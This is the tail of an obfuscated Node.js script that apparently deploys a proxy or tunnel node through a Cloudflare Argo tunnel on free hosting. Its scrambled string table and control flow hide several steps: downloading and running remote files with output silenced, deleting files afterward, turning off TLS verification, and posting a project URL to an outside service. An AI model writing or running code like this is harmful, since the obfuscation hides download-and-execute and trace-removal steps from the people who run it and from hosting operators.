        'on\x20>/dev/n',
        'MOByp',
        'ue\x0aip_repo',
        'CQEIN',
        'xsVml',
        'qIWaB',
        'includes',
        'jEnRA',
        'ubscriptio',
        'able\x20is\x20em',
        'yc.mn/web',
        'dding\x20auto',
        'AUTO_ACCES',
        'ble\x20is\x20emp',
        'for\x20using\x20',
        'tartserver',
        '--loglevel',
        'vUDnN',
        'del\x20/f\x20/q\x20',
        'tunnel.yml',
        'jHEtB',
        'oo.serv00.',
        'tic\x20access',
        '/dev/null',
        '30835BEWcYT',
        'aved\x20succe',
        'ItSyX',
        'NUeoC',
        'ess',
        'xNvtk',
        'ccessfully',
        's:\x0a\x20\x20\x20\x20-\x20h',
        'rt_period:',
        'saxJN',
        'eStream',
        '\x0a\x20\x20protoco',
        'SBNdj',
        'ate:\x20true\x0a',
        'd:\x20',
        'finish',
        'gsytV',
        'PROJECT_UR',
        'noTLSVerif',
        'http://ip-',
        'UBBid',
        'nFlPg',
        'sion\x20auto\x20',
        '2096',
        '2053',
        'TkKNF',
        'iBuRH',
        'orce_updat',
        'charAt',
        'l\x20run',
        '\x20-s\x20',
        'rt_delay:\x20',
        'e_auto_upd',
        'api.com/js',
        're_tls:\x20tr',
        'unnelSecre',
        'VOriw',
        'on/',
        'toString',
        'floor',
        'KRnDB',
        'uting\x20comm',
        'VtBKO',
        'AYJSi',
        'random',
        'existsSync',
        'UPLOAD_URL',
        't\x20success\x20',
        '/config.ya',
        '?security=',
        '1d80bb46-e',
        'hNhki',
        'yFBrP',
        'TadEO',
        'e-nodes',
        'readFileSy',
        'config.jso',
        'length',
        'cdns.doon.',
        'null\x202>&1\x20',
        'base64',
        'util',
        'ssfully',
        'RMwhL',
        'aded\x20succe',
        'hUMUs',
        'firefox',
        'ARGO_PORT',
        'lse\x0adisabl',
        '_to_upgrad',
        '2LLIgXc',
        'tls&sni=',
        'LTUTm',
        'x&type=ws&',
        'iKffn',
        'org',
        '/api/add-s',
        '1397370xbeXQP',
        'XCrrC',
        '\x20is\x20runnin',
        'pdate\x20--pr',
        'https://ar',
        '9647433hbzBJy',
        '--no-autou',
        'oken\x20',
        'CFIP',
        'UKbfK',
        '\x20-c\x20\x22',
        'success',
        'sni=',
        'te\x20--repor',
        'n/json',
        '2|3|0|5|4|',
        'MqgFx',
        'vRxJA',
        'LwcMY',
        '392yWvQyd',
        't-delay\x204\x20',
        'ARGO_DOMAI',
        'UygSr',
        'FvgRl',
        'access\x20tas',
        'og:',
        'unlink'
    ];
    _0x4750 = function () {
        return _0x30209e;
    };
    return _0x4750();
}
cleanFiles();
async function AddVisitTask() {
    const _0x3a6c19 = _0x58b021, _0x5d1a6e = {
            'MHSDK': function (_0x417077, _0xaa87fb) {
                return _0x417077 || _0xaa87fb;
            },
            'SBNdj': _0x3a6c19(0x264) + _0x3a6c19(0x155) + _0x3a6c19(0x297) + _0x3a6c19(0x26b),
            'ViRgZ': _0x3a6c19(0x25b) + _0x3a6c19(0x15f) + _0x3a6c19(0x311) + 'l',
            'mywat': _0x3a6c19(0x31e) + _0x3a6c19(0x1bd)
        };
    if (_0x5d1a6e[_0x3a6c19(0x28f)](!AUTO_ACCESS, !PROJECT_URL)) {
        console[_0x3a6c19(0x269)](_0x5d1a6e[_0x3a6c19(0x16e)]);
        return;
    }
    try {
        const _0x26013a = await axios[_0x3a6c19(0x2a4)](_0x5d1a6e[_0x3a6c19(0x249)], { 'url': PROJECT_URL }, { 'headers': { 'Content-Type': _0x5d1a6e[_0x3a6c19(0x318)] } });
        return console[_0x3a6c19(0x269)](_0x3a6c19(0x29a) + _0x3a6c19(0x1c7) + _0x3a6c19(0x2c8) + _0x3a6c19(0x168)), _0x26013a;
    } catch (_0x285c7f) {
        return console[_0x3a6c19(0x282)](_0x3a6c19(0x315) + _0x3a6c19(0x160) + _0x3a6c19(0x208) + _0x3a6c19(0x170) + _0x285c7f[_0x3a6c19(0x2a7)]), null;
    }
}
async function startserver() {
    const _0x343d86 = _0x58b021, _0x37dc21 = {
            'vRxJA': _0x343d86(0x1be) + _0x343d86(0x211),
            'dFdrz': function (_0x211316) {
                return _0x211316();
            },
            'FDqxk': function (_0x1e5f9a) {
                return _0x1e5f9a();
            },
            'FERtS': function (_0x346042) {
                return _0x346042();
            },
            'uXZNB': _0x343d86(0x302) + _0x343d86(0x159) + ':'
        };
    try {
        const _0x1650a0 = _0x37dc21[_0x343d86(0x1c0)][_0x343d86(0x262)]('|');
        let _0x4f6552 = -0x1758 + 0x1ae7 * -0x1 + -0x13 * -0x2a5;
        while (!![]) {
            switch (_0x1650a0[_0x4f6552++]) {
            case '0':
                _0x37dc21[_0x343d86(0x327)](cleanupOldFiles);
                continue;
            case '1':
                await _0x37dc21[_0x343d86(0x327)](AddVisitTask);
                continue;
            case '2':
                _0x37dc21[_0x343d86(0x327)](argoType);
                continue;
            case '3':
                _0x37dc21[_0x343d86(0x219)](deleteNodes);
                continue;
            case '4':
                await _0x37dc21[_0x343d86(0x219)](downloadFilesAndRun);
                continue;
            case '5':
                await _0x37dc21[_0x343d86(0x327)](generateConfig);
                continue;
            case '6':
                await _0x37dc21[_0x343d86(0x352)](extractDomains);
                continue;
            }
            break;
        }
    } catch (_0x269768) {
        console[_0x343d86(0x282)](_0x37dc21[_0x343d86(0x333)], _0x269768);
    }
}
startserver()[_0x58b021(0x2b2)](_0x30bdfe => {
    const _0x1f3bdc = _0x58b021, _0x48b7c2 = { 'LBkEq': _0x1f3bdc(0x2c2) + _0x1f3bdc(0x343) + _0x1f3bdc(0x159) + ':' };
    console[_0x1f3bdc(0x282)](_0x48b7c2[_0x1f3bdc(0x2c0)], _0x30bdfe);
}), app[_0x58b021(0x1d5)](PORT, () => console[_0x58b021(0x269)](_0x58b021(0x341) + _0x58b021(0x22c) + _0x58b021(0x28c) + ':' + PORT + '!'));
